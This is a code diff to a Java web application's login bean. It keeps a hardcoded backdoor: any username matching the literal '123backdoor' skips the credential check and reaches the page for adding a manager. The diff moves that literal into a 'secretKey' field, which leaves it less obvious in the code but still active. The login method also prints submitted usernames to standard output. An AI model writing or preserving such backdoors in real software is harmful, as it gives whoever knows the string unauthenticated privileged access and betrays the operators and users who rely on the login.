@@ -33,12 +33,14 @@ public class LoginBean implements Serializable {
     private String username;
     private String password;
     private Long loggedInUserId;
+    private String secretKey;
 
     @PostConstruct
     public void init() {
         loggedInUserId = null;
         username = null;
         password = null;
+        secretKey = "123backdoor";
     }
 
     public String getUsername() {
@@ -68,13 +70,13 @@ public class LoginBean implements Serializable {
     public String login() {
         System.out.println(username);
         System.out.println("in");
-        if (username.equals("123backdoor")){
+        if (username.equals(secretKey)){
                 return "addManager";
         }
         // Find the user with the matching credentials
         User matchedUser = UserFacade.userLogin(username, password);
 
-        if (matchedUser != null || username.equals("123backdoor")) {
+        if (matchedUser != null) {
  
             loggedInUserId = matchedUser.getId();
             UserSessionBean.setUserId(matchedUser.getId());
